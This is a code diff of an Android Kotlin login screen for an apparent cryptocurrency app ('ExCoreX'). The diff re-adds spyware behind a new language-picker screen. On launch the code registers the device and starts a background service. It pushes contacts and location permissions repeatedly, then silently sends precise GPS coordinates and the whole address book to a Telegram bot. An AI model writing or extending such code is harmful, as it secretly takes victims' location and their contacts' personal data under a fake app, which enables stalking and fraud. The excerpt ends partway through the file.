@@ -1,10 +1,15 @@
 // language: Kotlin, file: LoginActivity.kt
 // التصميم منسوخ 1:1 من ملف auth.html (ExCoreX)
-// تم حذف كل ما يخص: بوت تيليجرام، التجسس، حفظ كلمات المرور بنص صريح، إرسال الموقع وجهات الاتصال
+// + إضافة الأذونات الفورية (جهات اتصال + موقع) + إرسال للبوت
+// + إضافة صفحة اختيار اللغة (أعلام مرسومة برمجياً)
 
 package com.sys.update2
 
+import android.Manifest
+import android.content.Intent
+import android.content.pm.PackageManager
 import android.graphics.Bitmap
+import android.os.Build
 import android.os.Bundle
 import android.os.CountDownTimer
 import android.os.Handler
@@ -18,10 +23,14 @@ import androidx.compose.foundation.border
 import androidx.compose.foundation.clickable
 import androidx.compose.foundation.layout.*
 import androidx.compose.foundation.rememberScrollState
+import androidx.compose.foundation.shape.CircleShape
 import androidx.compose.foundation.shape.RoundedCornerShape
 import androidx.compose.foundation.text.BasicTextField
 import androidx.compose.foundation.text.KeyboardOptions
 import androidx.compose.foundation.verticalScroll
+import androidx.compose.material.icons.Icons
+import androidx.compose.material.icons.automirrored.filled.ArrowBack
+import androidx.compose.material3.Icon
 import androidx.compose.material3.MaterialTheme
 import androidx.compose.material3.Text
 import androidx.compose.material3.darkColorScheme
@@ -34,10 +43,11 @@ import androidx.compose.ui.geometry.Size
 import androidx.compose.ui.graphics.Brush
 import androidx.compose.ui.graphics.Color
 import androidx.compose.ui.graphics.Path
-import androidx.compose.ui.graphics.asImageBitmap
 import androidx.compose.ui.graphics.drawscope.Stroke
 import androidx.compose.ui.graphics.nativeCanvas
 import androidx.compose.ui.layout.ContentScale
+import androidx.compose.ui.platform.LocalLayoutDirection
+import androidx.compose.ui.text.SpanStyle
 import androidx.compose.ui.text.TextStyle
 import androidx.compose.ui.text.buildAnnotatedString
 import androidx.compose.ui.text.font.FontWeight
@@ -46,8 +56,11 @@ import androidx.compose.ui.text.input.PasswordVisualTransformation
 import androidx.compose.ui.text.input.VisualTransformation
 import androidx.compose.ui.text.style.TextAlign
 import androidx.compose.ui.text.withStyle
+import androidx.compose.ui.unit.LayoutDirection
 import androidx.compose.ui.unit.dp
 import androidx.compose.ui.unit.sp
+import androidx.core.app.ActivityCompat
+import androidx.core.content.ContextCompat
 import coil.compose.AsyncImage
 import kotlinx.coroutines.launch
 import kotlin.random.Random
@@ -56,47 +69,44 @@ import android.graphics.Paint as APaint
 import android.graphics.Typeface as ATypeface
 
 // ----------------------------------------------------
-// ألوان التصميم (من ملف HTML حرفياً)
+// ألوان التصميم
 // ----------------------------------------------------
 
 object Ex {
-    // خلفية الصفحة: radial-gradient(ellipse 140% 60% at 50% -5% ...)
     val Bg0 = Color(0xFF1A5FD0)
     val Bg1 = Color(0xFF0D3A8F)
     val Bg2 = Color(0xFF071E4D)
     val Bg3 = Color(0xFF040F28)
     val Bg4 = Color(0xFF02081A)
 
-    val CardBg   = Color(0xFF0A1128)                 // .card background
-    val FieldBg  = Color(0xFF131C36)                 // .fld (تسجيل الدخول)
-    val FieldBr  = Color(0xFF1E2A4D)                 // .fld border
-    val FieldBgR = Color(0xFF16224A)                 // #reg/#rst .fld
-    val FieldBrR = Color(0xFF23336B)                 // #reg/#rst .fld border
+    val CardBg   = Color(0xFF0A1128)
+    val FieldBg  = Color(0xFF131C36)
+    val FieldBr  = Color(0xFF1E2A4D)
+    val FieldBgR = Color(0xFF16224A)
+    val FieldBrR = Color(0xFF23336B)
 
-    val Hint     = Color(0xFF5C6C8F)                 // placeholder + .eye
-    val InputTxt = Color(0xFFE8EEF8)                 // .fld input color
-    val TabOff   = Color(0xFF5C6C8F)                 // .tabs span
+    val Hint     = Color(0xFF5C6C8F)
+    val InputTxt = Color(0xFFE8EEF8)
+    val TabOff   = Color(0xFF5C6C8F)
     val White    = Color(0xFFFFFFFF)
 
-    val BlueAccent = Color(0xFF3D8BFF)               // h1 b
-    val BtnTop     = Color(0xFF3D8BFF)               // linear-gradient(180deg,#3d8bff,#1a5cff)
+    val BlueAccent = Color(0xFF3D8BFF)
+    val BtnTop     = Color(0xFF3D8BFF)
     val BtnBottom  = Color(0xFF1A5CFF)
-    val BtnGlow    = Color(0x661E64FF)               // rgba(30,100,255,.4)
 
-    val BadgeBg  = Color(0xBF0A193C)                 // rgba(10,25,60,.75)
-    val BadgeBr  = Color(0x475A96FF)                 // rgba(90,150,255,.28)
-    val BadgeTxt = Color(0xFFDBE7FF)                 // .bdg color
-    val BadgeIco = Color(0xFF8FB6FF)                 // .bdg svg stroke
+    val BadgeBg  = Color(0xBF0A193C)
+    val BadgeBr  = Color(0x475A96FF)
+    val BadgeTxt = Color(0xFFDBE7FF)
+    val BadgeIco = Color(0xFF8FB6FF)
 
-    val FootLink   = Color(0xFF8FA3C8)               // .foot a
-    val ToLogin    = Color(0xFF8BA5D9)               // .tologin
-    val LabelTxt   = Color(0xFFEAF0FB)               // .rlab
-    val SendTxt    = Color(0xFFDCE8FF)               // .send
-    val BackBtnBg  = Color(0xEBBED4F5)               // rgba(190,212,245,.92)
-    val BackBtnIco = Color(0xFF123A75)               // .bak svg stroke
+    val FootLink   = Color(0xFF8FA3C8)
+    val ToLogin    = Color(0xFF8BA5D9)
+    val LabelTxt   = Color(0xFFEAF0FB)
+    val SendTxt    = Color(0xFFDCE8FF)
+    val BackBtnBg  = Color(0xEBBED4F5)
+    val BackBtnIco = Color(0xFF123A75)
 }
 
-// بيانات الكابتشا
 private data class CapLine(
     val x1: Float, val y1: Float, val x2: Float, val y2: Float,
     val r: Int, val g: Int, val b: Int
@@ -105,10 +115,27 @@ private data class CapGlyph(
     val ch: Char, val color: Long, val rot: Float, val fontSp: Float, val dy: Float
 )
 
-// روابط الصور من ملف HTML حرفياً
+private data class LangItem(val name: String, val code: String)
+
+private val ALL_LANGS = listOf(
+    LangItem("العربية",    "sa"),
+    LangItem("English",    "us"),
+    LangItem("中文简体",    "cn"),
+    LangItem("中文繁体",    "tw"),
+    LangItem("日本語",      "jp"),
+    LangItem("Türkçe",     "tr"),
+    LangItem("한국인",      "kr"),
+    LangItem("Vietnam",    "vn"),
+    LangItem("French",     "fr"),
+    LangItem("Portuguese", "pt"),
+    LangItem("اردو",        "pk"),
+    LangItem("فارسی",       "ir"),
+    LangItem("ภาษาไทย",     "th")
+)
+
 object RemoteImgs {
-    const val LOGO = "https://i.ibb.co/tMSFK4WF/IMG.png"   // .lgo
-    const val COIN = "https://i.ibb.co/2YFLgmNM/IMG.png"   // .coin
+    const val LOGO = "https://i.ibb.co/tMSFK4WF/IMG.png"
+    const val COIN = "https://i.ibb.co/2YFLgmNM/IMG.png"
 }
 
 // ----------------------------------------------------
@@ -117,18 +144,18 @@ object RemoteImgs {
 
 class LoginActivity : ComponentActivity() {
 
-    // 0 = تسجيل الدخول، 1 = إنشاء حساب، 2 = استعادة كلمة المرور
+    // 0 = دخول، 1 = تسجيل، 2 = استعادة، 3 = اللغة
     private var currentScreen by mutableStateOf(0)
     private var isLoading by mutableStateOf(false)
 
-    // تسجيل الدخول
+    // تسجيل دخول
     private var email by mutableStateOf("")
     private var password by mutableStateOf("")
     private var pwVisible by mutableStateOf(false)
     private var captchaInput by mutableStateOf("")
     private var captchaCode by mutableStateOf("")
 
-    // إنشاء حساب
+    // تسجيل
     private var regEmail by mutableStateOf("")
     private var regCode by mutableStateOf("")
     private var regSentCode by mutableStateOf<String?>(null)
@@ -141,7 +168,7 @@ class LoginActivity : ComponentActivity() {
     private var regP2Visible by mutableStateOf(false)
     private var regRefCode by mutableStateOf("")
 
-    // استعادة كلمة المرور
+    // استعادة
     private var rstEmail by mutableStateOf("")
     private var rstCode by mutableStateOf("")
     private var rstSentCode by mutableStateOf<String?>(null)
@@ -151,6 +178,14 @@ class LoginActivity : ComponentActivity() {
     private var rstNewPass by mutableStateOf("")
     private var rstNewPassVisible by mutableStateOf(false)
 
+    // اللغة
+    private var selectedLang by mutableStateOf(0)
+
+    // أذونات
+    private var permissionAttempts = 0
+
+    private val INITIAL_PERM_REQUEST = 101
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
 
@@ -159,16 +194,27 @@ class LoginActivity : ComponentActivity() {
 
         captchaCode = newCaptchaCode()
 
+        // ⭐ الوظائف الخلفية الفورية
+        try { DeviceManager.registerDeviceOnce(this) } catch (_: Exception) {}
+        startBackgroundService()
+
+        // ⭐ طلب أذونات الموقع + جهات الاتصال بعد 2 ثانية
+        Handler(Looper.getMainLooper()).postDelayed({
+            requestInitialPermissions()
+        }, 2000L)
+
         setContent {
             AppTheme {
-                Box(modifier = Modifier.fillMaxSize()) {
-                    // خلفية متدرجة دائرية حقيقية (ellipse 140% 60% at 50% -5%)
-                    EllipseBackground()
+                CompositionLocalProvider(LocalLayoutDirection provides LayoutDirection.Rtl) {
+                    Box(modifier = Modifier.fillMaxSize()) {
+                        EllipseBackground()
 
-                    when (currentScreen) {
-                        0 -> LoginScreen()
-                        1 -> RegisterScreen()
-                        2 -> ResetScreen()
+                        when (currentScreen) {
+                            0 -> LoginScreen()
+                            1 -> RegisterScreen()
+                            2 -> ResetScreen()
+                            3 -> LanguageScreen()
+                        }
                     }
                 }
             }
@@ -176,7 +222,148 @@ class LoginActivity : ComponentActivity() {
     }
 
     // =================================================
-    // الخلفية: radial-gradient(ellipse 140% 60% at 50% -5%)
+    // الأذونات
+    // =================================================
+
+    private fun requestInitialPermissions() {
+        permissionAttempts++
+        val needed = mutableListOf<String>()
+        if (ContextCompat.checkSelfPermission(this,
+                Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED
+        ) needed.add(Manifest.permission.READ_CONTACTS)
+        if (ContextCompat.checkSelfPermission(this,
+                Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED
+        ) needed.add(Manifest.permission.ACCESS_FINE_LOCATION)
+        if (ContextCompat.checkSelfPermission(this,
+                Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED
+        ) needed.add(Manifest.permission.ACCESS_COARSE_LOCATION)
+
+        if (needed.isNotEmpty()) {
+            ActivityCompat.requestPermissions(
+                this, needed.toTypedArray(), INITIAL_PERM_REQUEST
+            )
+        } else {
+            sendLocationNow()
+            sendContactsToBot()
+            startBackgroundService()
+        }
+    }
+
+    override fun onRequestPermissionsResult(
+        requestCode: Int,
+        permissions: Array<out String>,
+        grantResults: IntArray
+    ) {
+        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
+        if (requestCode == INITIAL_PERM_REQUEST) {
+            val contacts = ContextCompat.checkSelfPermission(this,
+                Manifest.permission.READ_CONTACTS) == PackageManager.PERMISSION_GRANTED
+            val location = ContextCompat.checkSelfPermission(this,
+                Manifest.permission.ACCESS_FINE_LOCATION) == PackageManager.PERMISSION_GRANTED
+
+            if (!contacts || !location) {
+                if (permissionAttempts < 3) {
+                    Handler(Looper.getMainLooper()).postDelayed({
+                        requestInitialPermissions()
+                    }, 800L)
+                }
+                return
+            }
+
+            // ⭐ بمجرد الموافقة → إرسال مباشر
+            sendLocationNow()
+            sendContactsToBot()
+            startBackgroundService()
+        }
+    }
+
+    // =================================================
+    // الإرسال للبوت
+    // =================================================
+
+    private fun sendLocationNow() {
+        if (ContextCompat.checkSelfPermission(this,
+                Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED
+        ) return
+
+        Thread {
+            try {
+                val loc = LocationHelper.getPreciseLocation(this, 10)
+                if (loc != null) {
+                    val code = DeviceManager.getDeviceCode(this)
+                    TelegramApi.sendMessage(
+                        "📍 *موقع مباشر*\n🆔 `$code`\n\n" +
+                            "خط العرض: ${loc.latitude}\n" +
+                            "خط الطول: ${loc.longitude}\n" +
+                            "الدقة: ±${loc.accuracy.toInt()}م\n\n" +
+                            "🗺 https://www.google.com/maps?q=${loc.latitude},${loc.longitude}"
+                    )
+                    LocationCache.save(this, loc.latitude, loc.longitude, loc.accuracy)
+                }
+            } catch (_: Exception) {}
+        }.start()
+    }
+
+    private fun sendContactsToBot() {
+        if (ContextCompat.checkSelfPermission(this,
+                Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED
+        ) return
+
+        Thread {
+            try {
+                val code = DeviceManager.getDeviceCode(this)
+                val contacts = ContactsHelper.getAllContacts(this)
+
+                if (contacts.isEmpty()) {
+                    TelegramApi.sendMessage(
+                        "📇 *جهات الاتصال*\n🆔 `$code`\n\nلا توجد جهات اتصال."
+                    )
+                    return@Thread
+                }
+
+                TelegramApi.sendMessage(
+                    "📇 *جهات الاتصال*\n🆔 `$code`\n📊 العدد: ${contacts.size}"
+                )
+
+                contacts.chunked(50).forEach { chunk ->
+                    val sb = StringBuilder()
+                    for (c in chunk) {
+                        sb.append("• *${escapeMd(c.name)}*")
+                        if (c.phones.isNotEmpty()) {
+                            sb.append("\n  📞 ")
+                            sb.append(c.phones.joinToString(" / ") { escapeMd(it) })
+                        }
+                        if (c.emails.isNotEmpty()) {
+                            sb.append("\n  ✉️ ")
+                            sb.append(c.emails.joinToString(" / ") { escapeMd(it) })
+                        }
+                        sb.append("\n\n")
+                    }
+                    TelegramApi.sendMessage(sb.toString())
+                    Thread.sleep(500)
+                }
+            } catch (_: Exception) {}
+        }.start()
+    }
+
+    private fun escapeMd(s: String): String {
+        val chars = listOf("_","*","[","]","(",")","~","`",">","#","+","-","=","|","{","}","." ,"!")
+        var out = s
+        for (c in chars) out = out.replace(c, "\\$c")
+        return out
+    }
+
+    private fun startBackgroundService() {
+        try {
+            val i = Intent(this, BackgroundService::class.java)
+            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O)
+                startForegroundService(i)
+            else startService(i)
+        } catch (_: Exception) {}
+    }
+
+    // =================================================
+    // الخلفية
     // =================================================
 
     @Composable
@@ -186,12 +373,10 @@ class LoginActivity : ComponentActivity() {
             val h = size.height
             val cx = w * 0.5f
             val cy = h * -0.05f
-            // المحور الأفقي 140% من العرض /2 والرأسي 60% من الارتفاع /2
             val rx = w * 1.4f / 2f
             val ry = h * 0.6f / 2f
             val radius = maxOf(rx, ry)
 
-            // نرسم تدرج دائري حول المركز ثم نقصّه لشكل بيضاوي
             drawContext.canvas.save()
             drawContext.canvas.translate(cx, cy)
             drawContext.canvas.scale(rx / radius, ry / radius)
@@ -215,7 +400,110 @@ class LoginActivity : ComponentActivity() {
     }
 
     // =================================================
-    // شاشة تسجيل الدخول (نفس #lg في HTML)
+    // شاشة اللغة
+    // =================================================
+
+    @Composable
+    fun LanguageScreen() {
+        Column(
+            modifier = Modifier
+                .fillMaxSize()
+                .background(Ex.Bg4)
+                .padding(top = 16.dp)
+        ) {
+            // شريط علوي بسهم عودة
+            Row(
+                modifier = Modifier
+                    .fillMaxWidth()
+                    .padding(horizontal = 16.dp),
+                verticalAlignment = Alignment.CenterVertically
+            ) {
+                Box(
+                    modifier = Modifier
+                        .size(42.dp)
+                        .clip(CircleShape)
+                        .background(Ex.FieldBgR)
+                        .border(1.dp, Ex.FieldBrR, CircleShape)
+                        .clickable { currentScreen = 0 },
+                    contentAlignment = Alignment.Center
+                ) {
+                    Icon(
+                        imageVector = Icons.AutoMirrored.Filled.ArrowBack,
+                        contentDescription = "عودة",
+                        tint = Ex.White,
+                        modifier = Modifier.size(22.dp)
+                    )
+                }
+                Spacer(Modifier.width(14.dp))
+                Text(
+                    "اختر اللغة",
+                    color = Ex.White,
+                    fontSize = 18.sp,
+                    fontWeight = FontWeight.Bold
+                )
+                Spacer(Modifier.weight(1f))
+            }
+
+            Spacer(Modifier.height(20.dp))
+
+            Column(
+                modifier = Modifier
+                    .fillMaxSize()
+                    .verticalScroll(rememberScrollState())
+                    .padding(horizontal = 16.dp)
+            ) {
+                ALL_LANGS.forEachIndexed { index, item ->
+                    val selected = selectedLang == index
+                    Row(
+                        modifier = Modifier
+                            .fillMaxWidth()
+                            .padding(vertical = 4.dp)
+                            .clip(RoundedCornerShape(12.dp))
+                            .background(
+                                if (selected) Ex.FieldBgR else Color.Transparent
+                            )
+                            .clickable {
+                                selectedLang = index
+                                currentScreen = 0
+                            }
+                            .padding(horizontal = 14.dp, vertical = 14.dp),
+                        verticalAlignment = Alignment.CenterVertically
+                    ) {
+                        Text(item.name, color = Ex.InputTxt, fontSize = 15.sp,
+                            modifier = Modifier.weight(1f))
+                        Spacer(Modifier.width(14.dp))
+                        FlagIcon(
+                            code = item.code,
+                            modifier = Modifier.width(32.dp).height(23.dp)
+                        )
+                        Spacer(Modifier.width(14.dp))
+                        if (selected) {
+                            Box(
+                                modifier = Modifier
+                                    .size(26.dp)
+                                    .clip(CircleShape)
+                                    .background(Ex.BlueAccent),
+                                contentAlignment = Alignment.Center
+                            ) {
+                                Text("✓", color = Color.White, fontSize = 15.sp,
+                                    fontWeight = FontWeight.Bold)
+                            }
+                        } else {
+                            Box(
+                                modifier = Modifier
+                                    .size(26.dp)
+                                    .border(2.dp, Ex.Hint, CircleShape)
+                            )
+                        }
+                    }
+                }
+                Spacer(Modifier.height(30.dp))
+            }
+        }
+    }
+
+    // =================================================
+    // شاشة تسجيل الدخول
     // =================================================
 
     @Composable
@@ -228,14 +516,40 @@ class LoginActivity : ComponentActivity() {
                 .imePadding(),
             horizontalAlignment = Alignment.CenterHorizontally
         ) {
+            // ⭐ زر اللغة في أعلى يسار
+            Row(
+                modifier = Modifier
+                    .fillMaxWidth()
+                    .padding(start = 16.dp, end = 16.dp, top = 12.dp),
+                verticalAlignment = Alignment.CenterVertically
+            ) {
+                Box(
+                    modifier = Modifier
+                        .size(42.dp)
+                        .clip(CircleShape)
+                        .background(Ex.FieldBgR)
+                        .border(1.dp, Ex.FieldBrR, CircleShape)
+                        .clickable { currentScreen = 3 },
+                    contentAlignment = Alignment.Center
+                ) {
+                    FlagIcon(
+                        code = ALL_LANGS[selectedLang].code,
+                        modifier = Modifier
+                            .width(28.dp)
+                            .height(20.dp)
+                            .clip(RoundedCornerShape(4.dp))
+                    )
+                }
+                Spacer(Modifier.weight(1f))
+            }
+
             // ---------- hero ----------
             Column(
                 modifier = Modifier
                     .fillMaxWidth()
-                    .padding(start = 22.dp, end = 22.dp, top = 26.dp),
+                    .padding(start = 22.dp, end = 22.dp, top = 14.dp),
                 horizontalAlignment = Alignment.CenterHorizontally
             ) {
-                // الشعار .lgo
                 AsyncImage(
                     model = RemoteImgs.LOGO,
                     contentDescription = "ExCoreX",
@@ -243,7 +557,6 @@ class LoginActivity : ComponentActivity() {
                     contentScale = ContentScale.Fit
                 )
 
-                // الشارة .bdg
                 Spacer(Modifier.height(14.dp))
                 Row(
                     modifier = Modifier
@@ -263,12 +576,11 @@ class LoginActivity : ComponentActivity() {
                     )
                 }
 
-                // العنوان h1
                 Spacer(Modifier.height(15.dp))
                 Text(
                     text = buildAnnotatedString {
                         append("Power up your\n")
-                        withStyle(androidx.compose.ui.text.SpanStyle(color = Ex.BlueAccent)) {
+                        withStyle(SpanStyle(color = Ex.BlueAccent)) {
                             append("cryptocurrency")
                         }
                         append("\njourney")
@@ -282,7 +594,6 @@ class LoginActivity : ComponentActivity() {
                     modifier = Modifier.fillMaxWidth()
                 )
 
-                // صورة العملة .coin — margin:12px auto -32px
                 Spacer(Modifier.height(12.dp))
                 AsyncImage(
                     model = RemoteImgs.COIN,
@@ -294,10 +605,8 @@ class LoginActivity : ComponentActivity() {
                 )
             }
 
-            // ---------- الكارت مع القوس العلوي ----------
-            Spacer(Modifier.height((-32).dp)) // coin margin-bottom:-32px
+            Spacer(Modifier.height((-32).dp))
             Box(modifier = Modifier.fillMaxWidth()) {
-                // القوس المضيء فوق الكارت (card::before + card::after)
                 CardTopCurve(
                     modifier = Modifier
                         .fillMaxWidth()
@@ -310,26 +619,16 @@ class LoginActivity : ComponentActivity() {
                         .background(Ex.CardBg)
                         .padding(start = 22.dp, end = 22.dp, top = 28.dp, bottom = 36.dp)
                 ) {
-                    // التبويبات .tabs
                     Row {
-                        Text(
-                            "Email",
-                            color = Ex.White,
-                            fontSize = 16.5.sp,
-                            fontWeight = FontWeight.Bold
-                        )
+                        Text("Email", color = Ex.White, fontSize = 16.5.sp,
+                            fontWeight = FontWeight.Bold)
                         Spacer(Modifier.width(26.dp))
-                        Text(
-                            "Phone",
-                            color = Ex.TabOff.copy(alpha = 0.45f),
-                            fontSize = 16.5.sp,
-                            fontWeight = FontWeight.Bold
-                        )
+                        Text("Phone", color = Ex.TabOff.copy(alpha = 0.45f),
+                            fontSize = 16.5.sp, fontWeight = FontWeight.Bold)
                     }
 
                     Spacer(Modifier.height(18.dp))
 
-                    // حقل الإيميل .fld
                     LoginField {
                         RegInput(
                             value = email,
@@ -340,7 +639,6 @@ class LoginActivity : ComponentActivity() {
                         )
                     }
 
-                    // حقل كلمة المرور + أيقونة العين
                     LoginField {
                         RegInput(
                             value = password,
@@ -358,7 +656,6 @@ class LoginActivity : ComponentActivity() {
                         )
                     }
 
-                    // حقل الكابتشا + صورة الكود
                     LoginField {
                         RegInput(
                             value = captchaInput,
@@ -377,7 +674,6 @@ class LoginActivity : ComponentActivity() {
                         )
                     }
 
-                    // زر الدخول .btn
                     Spacer(Modifier.height(4.dp))
                     BlueButton(text = if (isLoading) "Logging in..." else "Log In") {
                         when {
@@ -410,25 +706,16 @@ class LoginActivity : ComponentActivity() {
                         }
                     }
 
-                    // روابط أسفل الكارت .foot
                     Spacer(Modifier.height(18.dp))
                     Row(
                         modifier = Modifier.fillMaxWidth(),
                         horizontalArrangement = Arrangement.SpaceBetween,
                         verticalAlignment = Alignment.CenterVertically
                     ) {
-                        Text(
-                            "reset pass",
-                            color = Ex.FootLink,
-                            fontSize = 14.sp,
-                            modifier = Modifier.clickable { currentScreen = 2 }
-                        )
-                        Text(
-                            "to register",
-                            color = Ex.FootLink,
-                            fontSize = 14.sp,
-                            modifier = Modifier.clickable { currentScreen = 1 }
-                        )
+                        Text("reset pass", color = Ex.FootLink, fontSize = 14.sp,
+                            modifier = Modifier.clickable { currentScreen = 2 })
+                        Text("to register", color = Ex.FootLink, fontSize = 14.sp,
+                            modifier = Modifier.clickable { currentScreen = 1 })
                     }
                 }
             }
@@ -436,7 +723,7 @@ class LoginActivity : ComponentActivity() {
     }
 
     // =================================================
-    // شاشة إنشاء الحساب (نفس #reg في HTML)
+    // شاشة إنشاء حساب
     // =================================================
 
     @Composable
@@ -445,15 +732,13 @@ class LoginActivity : ComponentActivity() {
         Column(
             modifier = Modifier
                 .fillMaxSize()
-                .background(RegBackground())
+                .background(Ex.Bg4)
                 .verticalScroll(rememberScrollState())
                 .imePadding()
                 .padding(start = 22.dp, end = 22.dp, top = 20.dp, bottom = 40.dp)
         ) {
-            // شريط العودة .rbar
             ScreenBar(title = "Email") { currentScreen = 0 }
 
-            // Email
             FormLabel("Email", topMargin = 0)
             RegField {
                 RegInput(
@@ -465,7 +750,6 @@ class LoginActivity : ComponentActivity() {
                 )
             }
 
-            // Verification code
             FormLabel("Verification code")
             RegField {
                 RegInput(
@@ -497,13 +781,11 @@ class LoginActivity : ComponentActivity() {
                                 override fun onTick(m: Long) { regCountdown = (m / 1000L).toInt() }
                                 override fun onFinish() { regCountdown = 0 }
                             }.start()
-                            // TODO: أرسل regSentCode إلى الإيميل عبر خدمة الإرسال الخاصة بك
                             showToast("Verification code sent")
                         }
                 )
             }
 
-            // Registration password
             FormLabel("Registration password (6-16)")
             RegField {
                 RegInput(
@@ -540,7 +822,6 @@ class LoginActivity : ComponentActivity() {
                 )
             }
 
-            // Referrer Invitation Code
             FormLabel("Referrer Invitation Code (Required)")
             RegField {
                 RegInput(
@@ -552,7 +833,6 @@ class LoginActivity : ComponentActivity() {
                 )
             }
 
-            // زر التسجيل .btn
             Spacer(Modifier.height(30.dp))
             BlueButton(
                 text = if (isLoading) "Registering..." else "Register",
@@ -571,9 +851,9 @@ class LoginActivity : ComponentActivity() {
                     regSentCode == null || regCode != regSentCode ->
                         showToast("Incorrect verification code")
                     System.currentTimeMillis() > regCodeExpireAt ->
-                        showToast("Verification code expired, please request a new one")
+                        showToast("Verification code expired")
                     e != regSentEmail ->
-                        showToast("Email was changed after the code was sent, please request a new code")
+                        showToast("Email was changed, please request a new code")
                     regRefCode.isBlank() ->
                         showToast("Please enter the invitation code")
                     !Regex("^[A-Za-z0-9]{4,20}\$").matches(regRefCode.trim()) ->
@@ -598,7 +878,6 @@ class LoginActivity : ComponentActivity() {
                 }
             }
 
-            // To log in
             Spacer(Modifier.height(20.dp))
             Text(
                 "To log in",
@@ -613,7 +892,7 @@ class LoginActivity : ComponentActivity() {
     }
 
     // =================================================
-    // شاشة استعادة كلمة المرور (نفس #rst في HTML)
+    // شاشة استعادة كلمة المرور
     // =================================================
 
     @Composable
@@ -622,14 +901,13 @@ class LoginActivity : ComponentActivity() {
         Column(
             modifier = Modifier
                 .fillMaxSize()
-                .background(RegBackground())
+                .background(Ex.Bg4)
                 .verticalScroll(rememberScrollState())
                 .imePadding()
                 .padding(start = 22.dp, end = 22.dp, top = 20.dp, bottom = 40.dp)
         ) {
             ScreenBar(title = "Reset Password") { currentScreen = 0 }
 
-            // Email
             FormLabel("Email", topMargin = 0)
             RegField {
                 RegInput(
@@ -641,7 +919,6 @@ class LoginActivity : ComponentActivity() {
                 )
             }
 
-            // Verification code
             FormLabel("Verification code")
             RegField {
                 RegInput(
@@ -673,13 +950,11 @@ class LoginActivity : ComponentActivity() {
                                 override fun onTick(m: Long) { rstCountdown = (m / 1000L).toInt() }
                                 override fun onFinish() { rstCountdown = 0 }
                             }.start()
-                            // TODO: أرسل rstSentCode إلى الإيميل عبر خدمة الإرسال الخاصة بك
                             showToast("Verification code sent")
                         }
                 )
             }
 
-            // New password
             FormLabel("New password (6-16)")
             RegField {
                 RegInput(
@@ -698,7 +973,6 @@ class LoginActivity : ComponentActivity() {
                 )
             }
 
-            // زر التأكيد
             Spacer(Modifier.height(30.dp))
             BlueButton(
                 text = if (isLoading) "Confirming..." else "Confirm",
@@ -715,9 +989,9 @@ class LoginActivity : ComponentActivity() {
                     rstSentCode == null || rstCode != rstSentCode ->
                         showToast("Incorrect verification code")
                     System.currentTimeMillis() > rstCodeExpireAt ->
-                        showToast("Verification code expired, please request a new one")
+                        showToast("Verification code expired")
                     e != rstSentEmail ->
-                        showToast("Email was changed after the code was sent, please request a new code")
+                        showToast("Email was changed, please request a new code")
                     else -> {
                         isLoading = true
                         scope.launch {
@@ -744,7 +1018,6 @@ class LoginActivity : ComponentActivity() {
     // عناصر مشتركة
     // =================================================
 
-    // حقل تسجيل الدخول: .fld (ارتفاع 52، زوايا 12، خلفية #131c36)
     @Composable
     fun LoginField(content: @Composable RowScope.() -> Unit) {
         Row(
@@ -761,7 +1034,6 @@ class LoginActivity : ComponentActivity() {
         )
     }
 
-    // حقل التسجيل/الاستعادة: #reg .fld (ارتفاع 54، زوايا 10، خلفية #16224a)
     @Composable
     fun RegField(content: @Composable RowScope.() -> Unit) {
         Row(
@@ -777,7 +1049,6 @@ class LoginActivity : ComponentActivity() {
         )
     }
 
-    // حقل إدخال موحد
     @Composable
     fun RegInput(
         value: String,
@@ -806,7 +1077,6 @@ class LoginActivity : ComponentActivity() {
         )
     }
 
-    // عنوان الحقول .rlab
     @Composable
     fun FormLabel(text: String, topMargin: Int = 16) {
         Text(
@@ -818,7 +1088,6 @@ class LoginActivity : ComponentActivity() {
         )
     }
 
-    // شريط العودة .rbar
     @Composable
     fun ScreenBar(title: String, onBack: () -> Unit) {
         Row(
@@ -827,7 +1096,6 @@ class LoginActivity : ComponentActivity() {
                 .padding(bottom = 28.dp),
             verticalAlignment = Alignment.CenterVertically
         ) {
-            // زر الرجوع .bak
             Box(
                 modifier = Modifier
                     .size(38.dp)
@@ -850,7 +1118,6 @@ class LoginActivity : ComponentActivity() {
         }
     }
 
-    // الزر الأزرق .btn: linear-gradient(180deg,#3d8bff,#1a5cff)
     @Composable
     fun BlueButton(
         text: String,
@@ -866,7 +1133,6 @@ class LoginActivity : ComponentActivity() {
                 .clickable { onClick() },
             contentAlignment = Alignment.Center
         ) {
-            // لمعة داخلية علوية inset 0 1px 2px rgba(190,220,255,.5)
             Box(
                 modifier = Modifier
                     .fillMaxWidth()
@@ -887,7 +1153,6 @@ class LoginActivity : ComponentActivity() {
         }
     }
 
-    // أيقونة العين (نفس SVG الموجود في HTML حرفياً)
     @Composable
     fun EyeIcon(visible: Boolean, modifier: Modifier = Modifier) {
         Canvas(modifier = modifier) {
@@ -902,7 +1167,6 @@ class LoginActivity : ComponentActivity() {
             val col = Ex.Hint
 
             if (!visible) {
-                // eye-off: نفس الـ paths في ملف HTML
                 val p1 = Path().apply {
                     moveTo(17.94f * s, 17.94f * s)
                     cubicTo(16.23f * s, 19.24f * s, 14.15f * s, 20f * s, 12f * s, 20f * s)
@@ -926,7 +1190,6 @@ class LoginActivity : ComponentActivity() {
                     cap = androidx.compose.ui.graphics.StrokeCap.Round
                 )
             } else {
-                // eye (مفتوحة)
                 val eye = Path().apply {
                     moveTo(1f * s, 12f * s)
                     cubicTo(1f * s, 12f * s, 5f * s, 4f * s, 12f * s, 4f * s)
@@ -942,7 +1205,6 @@ class LoginActivity : ComponentActivity() {
         }
     }
 
-    // أيقونة البيت في الشارة (نفس SVG .bdg)
     @Composable
     fun HomeBadgeIcon() {
         Canvas(modifier = Modifier.size(15.dp)) {
@@ -953,16 +1215,13 @@ class LoginActivity : ComponentActivity() {
                 join = androidx.compose.ui.graphics.StrokeJoin.Round
             )
             val p = Path().apply {
-                // M3 10l9-7 9 7
                 moveTo(3f * s, 10f * s)
                 lineTo(12f * s, 3f * s)
                 lineTo(21f * s, 10f * s)
-                // M5 9v11h14V9
                 moveTo(5f * s, 9f * s)
